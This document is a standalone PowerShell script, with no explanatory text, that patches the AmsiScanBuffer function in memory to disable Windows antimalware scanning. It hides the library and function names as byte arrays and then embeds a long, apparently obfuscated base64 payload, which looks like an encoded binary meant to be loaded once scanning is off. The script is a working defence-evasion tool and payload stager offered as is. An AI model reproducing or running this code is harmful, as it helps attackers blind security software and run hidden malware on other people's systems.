
$Win32 = @"
using System;
using System.Runtime.InteropServices;

public class Win32 {

    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

}
"@

Add-Type $Win32
$test = [Byte[]](0x61, 0x6d, 0x73, 0x69, 0x2e, 0x64, 0x6c, 0x6c)
$LoadLibrary = [Win32]::LoadLibrary([System.Text.Encoding]::ASCII.GetString($test))
$test2 = [Byte[]] (0x41, 0x6d, 0x73, 0x69, 0x53, 0x63, 0x61, 0x6e, 0x42, 0x75, 0x66, 0x66, 0x65, 0x72)
$Address = [Win32]::GetProcAddress($LoadLibrary, [System.Text.Encoding]::ASCII.GetString($test2))
$p = 0
[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
$Patch = [Byte[]] (0x31, 0xC0, 0x05, 0x78, 0x01, 0x19, 0x7F, 0x05, 0xDF, 0xFE, 0xED, 0x00, 0xC3)
#0:  31 c0                   xor    eax,eax
#2:  05 78 01 19 7f          add    eax,0x7f190178
#7:  05 df fe ed 00          add    eax,0xedfedf
#c:  c3                      ret 
#for ($i=0; $i -lt $Patch.Length;$i++){$Patch[$i] = $Patch[$i] -0x2}
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, $Patch.Length)

$enc = [system.Text.Encoding]::UTF8


$EncodedText = "c2B7dmF8ens1XHtjen5wOEZ9dGdlUWB4ZRgfbhgfGB81NTU1TlZ4cXlwYVd8e3F8e3I9PEgYHzU1
NTVFdGd0eDU9GB81NTU1NTU1NU5GYWd8e3JIGB81NTU1NTU1NTFWenh4dHtxNSg1NzcYHxgfNTU1
NTwYHzU1NTUxd3RmcCMhd3x7dGdsKDdBQ2REVFRYVFRUVFBUVFRUOjotVFRZclRUVFRUVFRUVERU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVHJUVFRUVCFzYHIh
VGFUe1tcd3JXQVglfUNSfWV2bFdidngse3Z4U2FcUlt9d3ggY3FWV3xPRldscUIhcnRCIXJHUCxB
XFIkY09SQGBRRCVeX1RUVFRUVFRUVFdER0RUVEFUUFFUXnFneUMhVFRUVFRUVFRUVFpUVFxyVFlU
QVRUVFdMVFRUVFxUVFRUVFRUVCV/QFRUVFRyVFRUVERUVFRUVFdUVFRUclRUVFRUclRUV1RUVFRU
VFRUVFRQVFRUVFRUVFRUVFZUVFRUVFRyVFRUVFRUVFRYVERcQFRUV1RUVFdUVFRUVFRQVFRUUFRU
VFRUVFRUV1RUVFRUVFRUVFRUVFRUVFxUJFRUV0VUVFRUVFBUVFReYlNUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUUlRUVFRiVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUXFRUVFZUVFRUVFRUVFRUVFRUVFRWVlRUVFByVFRU
VFRUVFRUVFRUVFRWICVPTX0lVFRUVCdXQFRUVFRyVFRUVFNyVFRUVFxUVFRUVFRUVFRUVFRUVFRU
VFRWVFRUUlRgdntbbExiVFRUXmJTVFRUVERUVFRUVExUVFRUTFRUVFRUVFRUVFRUVFRUVFRUVFdU
VFRXVFl7X3l3Uix/VFRUWFRUVFRUUlRUVFRUVlRUVFRdclRUVFRUVFRUVFRUVFRUVFRUVERUVFRE
clRUVFRUVFRUVFRUVFRUVFRUVFRUViVbRFRUVFRUVFRQclRUVFRWVFRAVCJWWFRUX0RHVFRUV1RU
VFRXRFRUV3JUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRTTHpRclRUVntYRVRUVF5cVlRWVFRXY1BUVFRWfHpUVFdmYldUV2RUVFRU
VERUVFBEWHpQRFRUVnxiR3ZyUFRUXVRRXldcVFRUelFeV1hUVFR6Vl5XRFRUVHpeVG1xb1NEVFRW
cmZdU21Pb1NyVFRWcmJcV31MUn94eWNTYlRUVmEhXlZWYlJWUi1MVFRUXiZbIV5XbGJSVyctTFRU
VF4mWyFBUU1fc1RUV2JWQi1PVFRUXl5XXFRUVGdwVFZ6VFRUUHpUVFRWVFFQVFFBIVRWclRUVFRU
VlRWclRcfnpUVnJUVFRUVFRUVFRUQ3lMVFBtWFRUVFB3WFR2VFJyXFRUVFxUVFdTPlJyVFRWcnpC
Vm1EWFR9QG9RJl5vVFRXYl5XZlRUVHpCeHJiZ19iVFZeV2JUVFR6WCZ9JUFXJl46VFRXYlBEcWNS
RFRUVnxycVRUVF5eVyFUVFRncSREUFRUVH1jXWJUVFZ7Xm9UVFdiXlZUVFRUemZQfHJWVFRUUllE
YWwgYlRUdlZycFRUVF5eclRcd2xQVFRUellWUi18VFRUXlZhIWBQYn1sRkRQVHZUfWNdYlRUVnJ9
Y1xEVFRWemJ9VFRUV1BEfWNSRFRUVnxyf1RUVF5eVyFUVFRncXZyUFRUV0xbdmRYV1RdVHpfVFRU
Vn1YUHZnfldUXVRHV1RwWFxiVFRURnJ5VFRUXlBiQ2wgRFBUdldQUFchYn9UVFRXXlZAVFRUekFX
e1xHVHJXYlZSLXNUVFReVlItfVRUVF5/VlBUVFRQR1dGcn9UVFReXlchVFRUekdXR3JPUl1YeFRU
VF5QYn5SV21QX3dsdlRUVHpMc316VFRUZT5SclRUVnshdFRUVF5eVFBUVFRMWyZyYkdWRmJdUER5
Y1JUVFRWYWJfWnZMVFRUV2xBRFxUdlZycFRUVF52e3ZWVF1UR1dHUFJeVkBUVFR6el1yVFRWfVBT
UERMelRiVFRXe1lRVHJXYlBEQHpdRFRUVnxycFRUVF5QREB6UGJUVFZ7WXlUcldiVyFif1RUVFde
V1xUVFRlbHdyWFR2VnJ+VFRUXlBiZWx7VFhUdldYWXN8clRUVGVse3JYVHZSLWVUVFReUGJiR1FW
Ykx2Y3JRVF1UR1FdXFRXVFdid2x6VFRUenpdRFRUVn1YWVR9QG9GTVxMV1RXYlBEZnpdRFRUVnxy
cFRUVF52eVRQVF1UR1Z8cnFUVFReXlchVFRUZWx9ckRUdldQXl5XJVRUVHp6XXJUVFZ8ZWxFYkBU
dlR4WF5UVFRURnJxVFRUXl5XIVRUVHpkVFRUV15UVFRUVFRwVFR+e1RXJUFUVFRXVFRXZVRXVyBU
ViFBVFRUV1RyVFlURlBmVERiVFRUVFRQb1RQVF0tVFRUVFFUVFRHdmRYV1RdVHpfVFRUVnJlbHRE
QFR2VEx6XURUVFZyZl1eVmZUVFR6YVBNXyxXRFdiV2xycVRUVF5eVyFUVFR6ZFR6IWFXbUB6V1RU
VFd8elZ/eH5NWGwlVlNlenpZVFRUVnxROlREVFReViVUVFR6RlR8cmBUVFReWVR2XF5URFRUVExk
dmFQU1RdVHpdclRUVnx6Vn94fkxYYmVsJURAVHZWcnBUVFReXn0hVl5WLVRUVHpkVFBfQUZ+XFdU
VFBUVFRUVFRUYlRUVFcnWHwhYll/QGJbb1wmVFRUVFRUQFR3VFRUVFtEUVRUVH9zclRURFREVFRS
clNUVFR/QCZHbHRCIHt2YlRUVFRWelZEVFReVExUVFZbQ0BiUURRYlRUUFRUVFRWW11DQHlQVFRU
VCFULVRUWURXVFRUf0R4bWNMclRUVFRUVFRUVFZUVFRXR20lVlNUflRUVFRUPnJQb1RXTFRUVFBU
VFRUYVRUVFRUclRUVFRMVFRUVFlUVFRUWWJUVFRUUFRUVFRbVFRUVFRiVFRUVFBUVFRUV1RUVFRU
RFRUVFRcVFRUVFRUWFxWVERUVFRUVFRXclRgVHlMUFdyVndUeUxQV3JXIlRGRFBRYlcnV1RUVFdy
Vn9UT0RRV3JUR1RlRFFXclFsVE9EUVdyVlZUZURRV3JXWlRlRFFXcld7VGVEUVdyViNUT0RRV3JW
RVRBdlBXcldhVEF2UFdyUUNUT0RRV3JRZ1dTQFFXclZnVFF2UFdyVERUbFBUVnJUd1QnflFXclZ4
VCRAUVZyUVhXVkRQV3JUdldEUFRXcldNV3F+VldyUW9UYX5WV3JRe1RbflZXclFPVFZQVFdyUSNU
U0BRV3JXTFRWUFRXclRzVGxQVFZyV31UUn5RV3JWQFRTQFFXclRxV1NAUVdyUUZUeUBRV3JURlRT
QFFXclFsV1NAUVdyVEdUU0BRV3JRVFdWUFRXcldTVEZQVFdyViNUXEBQV3JUbFdEUFRXcld2VCRA
UVdyVHpXRlBUV3JUX1dDQFFXclZiVCYtUVdyVn1XXS1RV3JUXVdTQFFUVFRUVFdyVFRUVFRUVFBU
VERUV1RXVFRBREVkVG8lVFREVFdUVFRUVFRWVFRfUHInVEU+VFRQVEBWVFRUVFRUeXJXXVdEeldW
VFd6XFRUVFRUVkJUW0RQUXJQXFRUcn1UVFRUVF9MVDpyWEBURHpUQlZYVFRUVFR5cld+VG1+V1Zi
UX9cYlRUVFRWUlJXdlBXclRYVFRUVFREUVlXVFRUVHJUIlRUVFRUYlFfVFRUVFdUVC1URFRUV0RX
UFRiVFRXclQlVGJUVFdiVHhUYlRUVERRRVRUVFRUclFCVFdURFREV0BUVFRUVERWIldUflRTYkRX
VFdQVFNiRFJUV35UU2JEXlRWflRTYkREVFFQVFNiRERUUX5UU2JERFRQUFRTYkREVFB+VFNiRERU
U1BUU2JERFRTflRTYkREVFJQVFNiRENUUn5UU2JERFRdUFRTYkREVFlQVDpyRHRUWX5UU2JEc1RZ
flQmclR5VFh+VCZERCdUW1BUX0RQIlRYflRMVFNXVFh+VGdyR1JUXH5UU2JHWFRfUFRTYkdBVFpQ
VE9iU3ZURVBUQWJQUlRfflR2RFd+VEV+VCViWyxUXlBUUHJSVFReUFRHRFZdVFRQVyBURltUW1BU
X0RTV1ReUFRUclN+VFRQV1piQkFUXlBUW1RWT1ReUFR6VFZxVFRQVyBURn1UV1BXc0RWZVRUUFcg
VEZgVFx+VFNiRiRUXH5UYXJRVlRRfldZYl1cVF5+VFBETVhUXn5UYERZRlRQflcmREQnVFNQVyVU
XmVUU35XYkRFcVRUfldDYl1/VF1+VFNiRFJUVHJUXkRRIFRWIVRWYlRzVEYhVFBiVHpURiFUUmJX
XVRGIVRcYldEVEYhVF5iV3NURiFUWGJXc1RGIVRaYldzVEYhVERiV0RURiFURmJXeVRGIVRAYldz
VEYhVEJiV3NURiFUTGJXLFRGIVR0YlZ7VEZmVHRUUU1UVERRR0RYUVRbclFURFRQclRUVFREVFRU
VFRUVFRUVFRUVFRUVFElVGJUVFRyVFRUVFRUVFRUVFRUVFQtVFRnVFRUVFRUVFZUVFRUVFRUVFRU
VFRUVFFiVFNAUVRUVFRUVFRUVFAkZUwmX2N2Jyx4cVYgTXRCIW9YcldDRkIgJVhvXFRFUCRjT11D
Zk9BIVRAJnlvcVJDYVl+eUVUUiRvTCcsbHdSeXxUUnF5cVMsX09UV2J2eCx/T01bb0ZCRFRHJ0Ml
QF1fY0wnQ292JV8gRkJEVHZSeX5UUE9ld1JDW3cnR3lUUFtjd01XbE9NW290QixgQUIsfk9EV3tP
TUdzQUJDb3YnU3tPRFddT01HU3d7T2V2eCxgd0JDYHFTT312eHl9THhteVRQeVB0TVtidyZbfUx4
bXlUUnF5cVMsXExCIH53UkBUQCdTeE9AfX13eEdmT0RXe09NR3NAJ1N4T0BPZXdSQ1xMQiB+d1JA
VHRQT2V3UkBUdEIgUnRCbXlUUiwkcVBPZXdSQFRGTVtfd3lfY3dSQFRDJ3lgT1IsJnYlXyR0Qm0l
RkIgRncnbXlUUFtjd3tbY3dSQFRPJ0MlTSRXbHcnW3l2JltaTEIkeVRQcXlxU1dsdydbeXYmW3l2
JV8gQXhTYU9EV012eHklT0BtZXd4QFRBUix/TEJtW0xCW3p0QiB5VFJHJHdNV0BwTVd5VFBPZXdS
Q0F0UlNsT0RXUHRNW2J3Jlt5VFNHbHBDV312e1t5VFBHeXdSQyVPRFdNdnh5JU9EV11xQnl+RE1H
JXZ4eXxxTUd5VFBHeUx7Q3tPJ1N8d1JDV3FdR2x0Ql8kcVJAVEQnLGFDeHlvdEJfZk9AUyVxXV9l
THtDJU9EV1d2Jlt5d0JfZnBDR2VxUm15RE1HJXZ4eXxxTUd5VFBTb3YnQ2FMeG0gQ11ffU9SQ2FM
TV9nRE1HJXZ4eXxxTUd5VFBTb3YnQ2FMeG0gR3h5Zk9DT3l2e1tldycgV3FdR2x0Ql8kcVJAVERN
W29PQiR8d115UXcnIHh0QnEkdnhTJXRCLGBETUcldnh5fHFNR3lUUFNvdidDYUx4bSBHUkNvTCZf
ZXZdR2V3JyBXcV1HbHRCXyRxUkBURCcsYXZSeWZMTUdldycgRk9CbX1wUlMldEIsYHYlUyVxXV9l
THtDJU9EV1d2Jlt5d0JfZnBDV2x3J0ckTCZHV3FdR2x0Ql8kcVJAVERNW29PQiR8d115UXcmVyB2
eHl7dF1HV3FdR2x0Ql8kcVJAVERNW29PQiR8d115UXcnJGJMQiAgRE1HJXZ4eXxxTUd5VFNfJHd7
R2V3QkNRdyckYkxNR2VMeHlmdE1HIERNRyV2eHl8cU1HeVRQcXlxU099d11DeVRTW3pMTV9iR11D
YXZWIHlwUkBUQ1IsQXFdX2V3eHZUQCZ5b3FSQ2FZeVt5TCZDbHRNRyBZeVdsdEIgf3RNV313VFdN
dEIgfncmcW9AXV9ld3hbZXZSU2ZUUkd8Tyd9eXddVGBPUm1mVFBPZXdSQ0FxXV95TEIlVEckZWV2
U1sldnhDfXdEV39MQm1mTHhTf3QkV312eFNhVF1Db09NX0FxXV95TEIkRExNX313RFd5cF1XRExN
X313RFdEdngse3Z4U2FUU1sgdiZHeXdEV1Z3JyxmT0JTYFRQJH10QiFUQCZ5b3FSQ2FZfnlFWX5b
Y3dNV2xPTVtvdEIsYFRTWyB2Jkd5d0YgXXdSLHxMQm1lcHhTJXRCLGBUU1sgdiZHeXdGIEZPQk9m
T0JbJXRCLGBUUEMhTCdDYnFSeWN3cldacUIkfE9NX1J3Jl9hTE1HX3d4T2NUUnF5cVMsX3d7T312
eHl9d3tHX3d4T2NUU2V5dngtVEFCeWB0QEckd01XTXZ4eSVPQEckd01UVEAnciV2e1dQcUIkYlRT
W3pMTV9iR11DYXZUV1t0QiBlT11DYXZUV19HeCxsd0JTJUBdX2NxeHl+T01cVFl4WyV3JlxURkIg
JUBdR2xUU1sgdiZHeXdGIFB0QlN7d3gsb3FSeX92YldBcE1bJU9CJWBAe0NgcVJ5YU9GIF93e0d5
dngsYkAnQ2xxeHl/T01YVEAmeW9xUkNhWXlfJHd7R2V3QkBgRCcsYXZSeWZPTV9BT01fJ3RCW3l2
YldQT0JfJE8ncWV3eHFbdydHeXZiV1t0QltsdyZbY097RGBDJ3lgWG9cYEAnU3hPQH19d3hHZk9N
WFRBe0NhTHhDbEAmRyB3UkNvVFNfeUxCR1d3Um1WcE1HeXZiV312eHFvVFBPZXdSQ1dMJ1t5diZY
VHRTV2x3J1t5diZYVEQnLGF2XV95diZYVEdNfWV2JkdvVFBPY3Z4JH1xVFdFTHhleUwmRFRHQiAn
dE1fY3d4JHl3e0RURydDJUQmQ2x2eENgcVRXUXcnICdPTV8lVFAsYk9CIEFxQl9ZT01+VEB4Q3t0
TVsldnt5WU9NflRHUnlsT0JbJXcmXyBUU195Tyd5b3FdXyBUUixiTSVDbXFCU2Z0TUcgVFB5b0ZS
eXt0UHlgcVJDe3Z4eSVwRFdNdEIgfncmcW9GQkd5d3tHZXFdflRUVFdxQmJXTFRTJVRcVFdFVF1A
VHFUV2JUXUBUcVRUclRSTFR0RFdmVFJAVFxUVHtUXWZUWFRXLFRWdlRcVFd9VFJiVHZyV3lUUlBU
T1RXIFRWVFRPRFchVFJ+VHZiVyVUXVhUWVRUclRdXFRPRFdhVFItVHFyV2VUUiFUT2JUV0AkZlRC
VFdxVFZUVEdEVyFUUlhUT0RXYlRdRFR0RFdjVFIhVFxUVyZUUnJUdERXZlRSQFRcVFd/VFItVHdE
V2JUXVxUT0RXb1RdWFR0RFdgVFJ2VFxUV3hUUn5Ud1RXeVRRelRcVFciVFFUVHNEVFRWJ2JUdmJX
fVRdWFR2YlRUX2J6VEJiV0xUUyVUR0RXIVRSWFRPRFdiVF1EVHREV2NUUiFUWnJUclRdZlRYVFcs
VFR6VFRSUF5UU2ZUQlRXcVRWVFRBcldjVF1EVFxUV2VUUiFUXFRXelRSflRPYld6VFZUVHREV2BU
XURUT0RXe1RdXFR0RFclVF1+VFlUVHJUXUBUd3JXfVRSXFR3VFd5VFZUVHFUV2NUVlRUQURXZVRS
IVR0RFdQVF1AVHdEV2JUVlBUVnJUVEJEelRCYldMVFMlVFxUV1NUXVxUdnJXY1RdXFRcVFd7VFJA
VHFUVyVUUn5Ud3JXe1RWVFR0VFd9VFIhVE9UV2ZUUkBUXFRXJVRSLVRcVFciVFFUVHNEVHJUVnJU
cGJUbVRdJVReRFQjVFZUVHBiVGxUXSVUVnJUVFNDWFRwRFdvVF1EVE9EV2FUU1xUd2JXY1RdRFRU
VmEiVFFUVHNEV3ZUU0RUT0RXYVRdVFRNVFd+VFJAVExyVyRUUnZUcGJUbVRdJVRZcldjVF1AVHFU
VFReJmZUWFRXLFRTYlRDVFd5VFIlVHZUV3ZUUkRUT0RXfFRdQFRPYlciVFFQVHNEVGBUUlxUdERX
YFRUVCJWcld3VFZ6VE1EVHJUUERUcURXYVRdVFR0RFdgVFJ2VFxUVyJUUVRUc0RUclRWclRwYlRt
VF0lVF5EVHJUXURUd2JUclRdZlRYclcsVFRUZUJiVGdUUyVUXFRXUFRdQFR3RFdiVFZUVHZiVyRU
UlhUTGJXeVRdWFR2Yld4VF1AVHdUVH1UVFdZVnJXd1RWelRNRFRyVFBYVHdiV2FUXVRUdnJXeVRd
WFR2YldlVFIhVE9iVHJUXWZUWFRXLFRWVFRxVFdjVFZUVHBiVG1UXSVUXFRXe1RdelR0RFdiVFZU
VE9yV2VUUmJUT0RUVFxDZlRecldxVFZUVEdUV3lUUmJUT0RXJVRSflR3cld7VFZUVHBiVGJUXSVU
VFxWXVZyV3dUVmZUTURUclRQRFRxRFdhVF1UVHREV2BUUnZUXFRXf1RSLVR3RFdiVFJiVE9EVyVU
UkBUT1RUYFRWVFRAcld5VFIhVExEV2FUUkBUXFRXeFRSflR3VFd5VFZUVHFUV2NUVlRUXHJXflRS
QFRMclckVFJ2VHBiVGJUXSVUWXJXe1RdelRcclRyVF1EVHdiVHJUUkRUT0RXf1RSLVR3RFdiVF1c
VE9EV29UXVhUWXJUVFlDVFRAcldFVFBYVEdEV0FUU1hUQWJXRlRTLVRERFdGVFBYVEZUV19UU0RU
R0RXUVRTRFRDRFdGVFBAVFRUUFRCQ1hUd2JXeFRdRFRxYld9VF1cVE9EV3ZUUCVUdERXf1RdXFR3
YldvVFItVE9yVyVUU2JUQ2JXZVRSIVRPVFdjVF12VHZiVHJUUCFUQ1RXdlRQWFRxRFdsVF1cVE9E
V2BUXURUQ3JXeVRdXFR2YldlVFItVHdyVFRXJmZUWFRXLFRUVE1AVFdsVFItVE9UVyRUUlhUcVRX
WlRSUFR3RFd5VFRUJlZyV3dUVnpUTURUclRQLVR2VFd5VF1cVExEVyVUUn5Ud3JXe1RWVFRAYlcg
VF1YVHFUV3lUUiVUXFRUI1RWVFRwYlRiVF0lVFRRQ3dUVnpUTURUclRQUFR2cld/VFJyVHREVyVU
UkBUTGJXJVRdQFR2cld5VFZUVFxUVHJUVlRUXFRUI1RWVFRwYlRiVF0lVFRcViZCYlRkVFMlVFxU
V0NUXVhUT0RUclRWXFR2Yld5VFJmVHFEV2xUUmJUdmJXfVRRelRacldhVFJ+VHdyV2VUUkRUcURX
YVRdVFRcVFd+VFJAVExyVyRUUnZUWXJXY1RdQFRxVFR8VFZUVFxyV29UUkBUdGJXJFRdXFR3VFdv
VFJQVFpyVCNUUmJUd2JXe1RSLVR3cldEVFJQVHZiV29UXXZUd2JXbFRSRFR2YlRyVFJMVHFEV2ZU
UmJUXHJUclRSLVR3clRyVF1EVHRUV3lUVlRUdmJXfVRSJVRPRFRyVFAtVEBiVGNUUlBUdnJXf1RS
clRWclRUXkNmVEJUV3FUVlRUR1RXJFRSJVR2VFRyVFJMVExEV2VUUmJUT0RXflRRelRcVFciVFFU
VHNEVFRQJmZUWFRXLFRTYlRDVFd5VFIlVHZUV3ZUVFdBVnJXd1RTclRNRFRyVFBEVHFEV2FUXVRU
XFRXflRSflR2cld5VFJYVHFUV2NUXVxUcERUclRWXFRwYlRiVF0lVFxyVHJUUkRUd2JXeVRdWFR3
clR7VF1EVFxUV3lUXXJUdERXb1RdRFRcRFReVFRTQVZyV0RUUmJUT0RXfVRdWFRPRFRyVF1AVHZi
V3lUVlRUXHJXQVRSclRMRFdsVF1UVEdUVyRUUiVUdlRUYFRSQFRwVFd5VFZUVEJiV2JUUn5UT1RX
cVRWXFRcVFd4VFItVHZyV2FUUlBUcVRUXlRUVFRUVFZRdEVXZlF6Xn9BXllFcGFhJiRlQmNUVERy
VERQXFRsVFRUREByVERQR1BERHJURFBaV1ZUV1REXFBUVFRGQkRAclREUEZCREByVERcR0xEel1X
VyVTUH5ARkZHX1tXVFRXVHIhU1RUXFdRfWJQVFRQV1FyQFRURyVTUXJMclRyUFpQQiVcXFRYV1B7
UEdxRFxdXFRYV11EQFxWVFhyVFQhQFdiJUxWR19HVHIhWlF9X1tQfiVGR0QhWlB5QFZXfXJSVFRQ
cVB5UFpXRFRXUHlQXFdEVFZRciF2V0RUVlRyIVpUbFRUVlRYclRXcl1UVERaUX1idl1URFRURCFa
V3JUUVFyIXZdVGJyV1RQWlBCJUdyX1BHcl9AU1xUVEZyX35RV31fQ1dGVFdQeUBaV1ZUV11UIVNX
YlhaUXJyU1RUVEZyXiVYVFREVlF9UlRmR15UYUdUXFZZcSNNU0xPW1pWX1dFOjo6Oi1ZVFR2VlJU
fkZERH5MUldyUVRUVFZXRFRWVEQhWldUVFdURHJTVFRQV11EIVxURFRcVFRUVFRUVHBURFRXVFNE
VlN5cWxMTVdadycgU3BSW3l2XUdldycgQHRdX2NxJlhXVlRQVFRyVFRUVFRUUXJQVFZDW3pMTV9i
R11DYXZUVFRXRFBUVFRUVFNiUFRQfltjdl15bHRCcXpxVlFWZEZUclh/VG1aVFRUXkRQVF9RdiBM
b3l8THhQb1lCUGJPQlBhW1FYbUxsJSFbf09/WUF2JlhRVCVaUVRsT1F9fVhUVFRRVFBUV29QYFhW
IWJZf1RUVF5yJFRUVFRUVFRUVFRUVFRYXCRUVFRUXFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUViVbRFRUVFRUVFRUVFRUVFRUVFMsUXcmX1NwUkNbTEJ5YFRSJG9MJyxsT0JAYE9SbWZUVFRU
VFRROl9EVHJEVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRWVFdUVFRUVHJUVFZUUlRUVFRTVFRUXFRUVFRUVFRU
VFRUVFRUVFRUVFRUUFRURFRUVFFyVFRcVFRUVFRUVFRUVFRUVFRUVFRUVFRQVFRUVFRUXFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFBUVERUVFRSclRUXFRUVFRUVFRUVFRUVFRUVFRUVFRUUFRUVFRU
VF5iUVRUVkREVFRUXVRYVFRUVFRUVFRUVFRUVF1UWCVUVFRUQ3JXQVRTLVRDcldTVFNcVEBiV19U
UC1UQXJXc1RQflRBcldSVFAtVFRUVFRUWSVQIjohVFRUUFRUVFRXVFRUVFRUVFRUVFBUVFRUVFRR
LVRUVFRUVFRUVFdUVFRUVFBUVFRUVFRUVFRUVFRUVFRUVFRUV1BUVFRUVERXQlRSUFR2cldSVFJ+
VHdUV3lUUH5Ud3JXeFRSLVRUVFRUVFZEVFdUVFRUU0RUdnJXfVRSIVR2YldmVFJQVHFUV2VUUi1U
d3JUVFRUVFRUVFZiV11iVlRUVFdUU1hUcVRXbFRSflR3cld7VFBMVHREV2ZUUkBURkRXYFRSTFR3
YlRUVFNyVlRUVFdUUVRUWFRUYlRRVFRYVFQlVFJcVFhUVFRUV3pUVERUV1RQWFR3YldhVFIlVE9E
V2BUXURUdmJUVFRUVFRUVFR8VFRQVFREV1FUUi1Ud0RXYlRSUFR3clcgVFAhVExEV2FUUkBUVFRU
VFRUVFRUVFQtVFR6VFREV1JUUn5Ud1RXeVRQRFRPRFdvVFJYVHZyV2VUXVRUcVRXZVRSLVR3clRU
VFRUVEBiV3pUUlBUdnJXYlRQRFRxRFdhVF1UVFRUVGJUVHJUVERXUlRSflR3VFd5VFNMVE9EV2xU
XVhUdERXY1RSIVRUVFRUVFFQVFlyVGJUViFUWFRUYFRRVFRUVFQtVFQhVFREV19UUiFUcVRXeVRd
XFR3cld9VFJiVEFyV31UUiVUT0RUVFRTWFR0VFd9VF1cVHZUV1BUXUBUd0RXYlRWIVRPRFchVFJA
VFRUV1xUV1xUVERXWFRSQFRPYld9VFJiVERiV2NUXVRUcERXbFRSflRPYld6VF1EVFRUV1FUUi1U
dlRXIFRdXFR0RFd7VFJyVHFUVHJUXn5UXFRUclRRXFRYVFRtVFFyVFRUVGRUVFBUVERXWFRSQFRP
Yld9VFJiVENUV2xUUlBUT1RXeVRSJVRMRFdsVFJmVHZiVFRUVFRUVFRUVFRQRFRRclRXVFAtVHZy
V2VUUnZUdERXYFRSUFR3VFdSVFJ+VHdUV3lUUiFUTERXYVRSQFRUVFdBVFJyVExEV2xUXVRUR1RX
JFRSJVR2VFRgVFJAVHBUV3lUVFRUW1RUXlRUUFRAVFdsVFItVE9UVyRUUlhUcVRXWlRSUFR3RFd5
VFRUVFRUV0FUUnJUTERXbFRdVFRHVFckVFIlVHZUVFRUUURUVlRUV1RTVFR2cldjVFJEVHFEV39U
XURUQ3JXeVRdXFR2YldlVFItVHdyVFRUUVBUWXJUYlRWIVRYVFRgVFFUVFRUVCFUVHJUVERXV1Rd
WFR2Yld5VFIlVExyV2ZUXX5UXFRXQlRSQFR2cldvVFJ+VHdiV2BUVFRUWERUYFRRVFRZclRiVFYh
VFhUVFRUWW1RVFRRZFREVFRUVFRUVFRUVFRUUWNgIi0tRSZ9YXdWVydPTV9vdEIsYEVGXG1Zf1R8
XFJDYEwnLH50QiB7RUZfQ0NQTGFaVlxydiZHfXd4R313UixgT0ElfHBCQ29cfy0+UUR6W1Z/bX12
Jlt5d0JfZnBGVyF3Qm1gdm8lfHFNX2Bae1t/dFJDYUxNWGF3Qnl/dngsb3cnTyVZQltjd0FlfXYn
JWBxf1B8XFIkfXd4eXhPTVslQ3hDbHYneWN3fyV8WEYhYlx/IVtWfFRyRVJTb3YnQ2FMeG0gRkJH
eXd7R2VxXX5ycXhDbHYneWN3fyV8WEYhYll/VGBYVlxyd3hTYU9BJXxBTXlXdl1XZnRCW31xUnlj
d3wgfXZdVHxZbyFbVnxUckVdR2xxTVslRkIgeHdsVyF3Qm1gdm8lfHFNX2Bae1t/dFJDYUxNWGF3
Qnl/dngsb3cnTyVZQltjd0FlfXYnJWBxf1x8RXIlXlxWVHJcUW1vT0JbJHZ4eSVwQSFbVnxUclxW
VHJcUW1sT01TJE9NWyVPQkdEdnh5J3RCbXlPJ0NvXF19YXdSIG9FRl8kdnghI3YnW3pPQiR9dmwk
YXRCW2x3JltjT3tEYUwnLGFaeFNvd0YgJ1hsXD5RRHpyXFZUclxWVHJcUW1sT01TJE9NWyVPQkdT
cFJDf3FNR2V3JyBYT01PeXdWV2ZPTU95d1ElfExNW193e09jdCdDbFx8VyR0QFN/TCdDb3ZvJXxP
eFNmdidAfFlvIVtWfFRyXFZUclxRYmN2eENtcUJDb3FSQ35AXV9lcXh5Zk9CcXl2byFbVnxUclxW
VC1ZJlt5TCZDbHRNRyBFciVeXFZULVkmR2xxTVslRkIgeHdvIVtWf2JjTE1bb09CJHx3XX4+VFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFFUVFRUYlRUVFFAW0RUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
VFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRUVFRU
